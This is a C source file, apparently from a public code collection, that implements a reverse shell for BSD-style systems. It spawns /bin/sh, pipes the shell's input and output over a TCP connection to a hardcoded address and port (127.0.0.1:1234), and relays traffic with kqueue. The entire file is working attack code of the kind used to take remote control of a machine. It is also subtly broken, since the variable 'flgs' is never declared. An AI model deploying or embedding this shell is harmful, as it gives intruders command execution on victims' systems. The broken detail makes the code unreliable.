/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/event.h>
#include <sys/mman.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
    struct sockaddr_in sa;
    u_long      ip=0x0100007F;
    int         in[2], out[2];
    pid_t       pid;
    char        *pargv[2];
    char        buf[BUFSIZ];
    
    int         s, r, i, len, end, kq, nev;
    struct kevent fdlist[2];
    struct kevent evlist[2];
    
    // create pipes for redirection of stdin/stdout/stderr
    pipe(in);
    pipe(out);

    // create /bin/sh as child process
    pid=fork();
    
    if (!pid) {
      dup2( in[0], STDIN_FILENO);
      dup2(out[1], STDOUT_FILENO);
      dup2(out[1], STDERR_FILENO);
      
      close(in[0]);
      close(in[1]);
      
      close(out[0]);
      close(out[1]);
      
      pargv[0]="/bin/sh";
      pargv[1]=NULL;
      
      execve("/bin/sh", pargv, NULL);
    } else {      
      close(in[0]);
      close(out[1]);
      
      // create a socket
      s=socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      
      sa.sin_family = AF_INET;
      sa.sin_port   = htons(1234);
      memcpy (&sa.sin_addr, &ip, sizeof(ip));
      
      // attempt connection to remote host
      connect(s, (struct sockaddr*)&sa, sizeof(sa));
      
      // create new kernel event
      if ((kq = kqueue()) > 0) {
        
        // initialize structure
        EV_SET(&fdlist[0], s, EVFILT_READ, 
            EV_ADD | EV_CLEAR, 0, 0, 0);
            
        EV_SET(&fdlist[1], out[0], EVFILT_READ, 
            EV_ADD | EV_CLEAR, 0, 0, 0);
        
        for (end=0; !end;)
        {
          nev=kevent(kq, fdlist, 2, evlist, 2, NULL);
          
          if (nev <= 0) {
            break;
          }
          
          for (i=0; i<nev; i++)
          {
            flgs = evlist[i].flags;
            
            if (flgs & EV_EOF) {
              end=1;
              break;
            }
            if (flgs & EV_ERROR) {             
              end=1;
              break;
            }
            // socket?
            if (evlist[i].ident == s)
            {
              // receive incoming data
              len = read(s, buf, BUFSIZ);
   
              // write to stdout 
              write(in[1], buf, len);
            } else 
            if (evlist[i].ident == out[0])
            {
              len = read(out[0], buf, BUFSIZ);
              // send to remote peer
              write(s, buf, len);
            }
          } // end for
        }
        close(kq);
      }
      kill(pid, SIGCHLD);
      close(s);
    }
    close(in[1]);
    close(out[0]);
    
    return 0;
}
    
